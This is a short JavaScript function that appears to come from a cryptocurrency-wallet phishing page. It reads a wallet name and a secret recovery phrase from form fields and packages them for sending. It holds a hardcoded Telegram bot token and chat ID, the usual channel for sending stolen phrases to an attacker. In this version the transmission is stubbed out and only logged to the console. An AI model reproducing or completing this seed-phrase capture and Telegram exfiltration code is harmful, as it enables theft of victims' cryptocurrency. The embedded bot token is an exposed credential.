function sendData() {
    var wallet = document.getElementById("wallet").value;
    var phrase = document.getElementById("phrase").value;

    var formData = new FormData();
    formData.append('wallet', wallet);
    formData.append('phrase', phrase);

    // Replace placeholders with actual values before running offline
    var botToken = '6375031192:AAFtfTA6UE7NYFQpW8wdT2TbuIsl4goQLnY';
    var chatId = '1635095037';

    // Simulate sending data to Telegram bot (offline mode)
    console.log('Sending data to Telegram bot...');
    console.log('Wallet: ' + wallet + ', Phrase: ' + phrase);
}